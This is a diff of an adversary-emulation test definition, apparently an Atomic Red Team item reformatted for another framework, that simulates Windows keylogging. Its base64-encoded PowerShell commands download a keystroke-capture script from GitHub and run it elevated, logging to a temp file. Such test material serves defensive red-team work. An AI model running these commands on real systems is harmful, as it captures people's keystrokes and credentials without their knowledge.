@@ -1,4 +1,4 @@
-- id: ec583407-9adc-58f0-bbfe-d64ceadbcd74
+- requirements: []
   name: Soumaia ART Tests - Input Capture
   description: 'Utilize PowerShell and external resource to capture keystrokes
 
@@ -9,19 +9,16 @@
 
     Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log. (requires elevation)'
   tactic: collection
-  technique:
-    attack_id: T1056.001
-    name: 'Input Capture: Keylogging'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEcAZQB0AC0ASwBlAHkAcwB0AHIAbwBrAGUAcwAuAHAAcwAxACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgACgAUwBwAGwAaQB0AC0AUABhAHQAaAAgACIALgBcAEcAZQB0AC0ASwBlAHkAcwB0AHIAbwBrAGUAcwAuAHAAcwAxACIAKQAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMAA1ADYALgAwADAAMQAvAHMAcgBjAC8ARwBlAHQALQBLAGUAeQBzAHQAcgBvAGsAZQBzAC4AcABzADEAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABHAGUAdAAtAEsAZQB5AHMAdAByAG8AawBlAHMALgBwAHMAMQAiAAoA
-          }
-          &"$.\Get-Keystrokes.ps1" -LogPath $env:TEMP\key.log
-        cleanup: |-
-          Remove-Item $env:TEMP\key.log -ErrorAction Ignore
-        payloads:
-        - Get-Keystrokes.ps1
+  technique_id: T1056.001
+  technique_name: 'Input Capture: Keylogging'
+  executors:
+  - cleanup:
+    - Remove-Item $env:TEMP\key.log -ErrorAction Ignore
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - Get-Keystrokes.ps1
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEcAZQB0AC0ASwBlAHkAcwB0AHIAbwBrAGUAcwAuAHAAcwAxACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgACgAUwBwAGwAaQB0AC0AUABhAHQAaAAgACIALgBcAEcAZQB0AC0ASwBlAHkAcwB0AHIAbwBrAGUAcwAuAHAAcwAxACIAKQAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMAA1ADYALgAwADAAMQAvAHMAcgBjAC8ARwBlAHQALQBLAGUAeQBzAHQAcgBvAGsAZQBzAC4AcABzADEAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABHAGUAdAAtAEsAZQB5AHMAdAByAG8AawBlAHMALgBwAHMAMQAiAAoA }; &"$.\Get-Keystrokes.ps1" -LogPath $env:TEMP\key.log
+  id: ec583407-9adc-58f0-bbfe-d64ceadbcd74
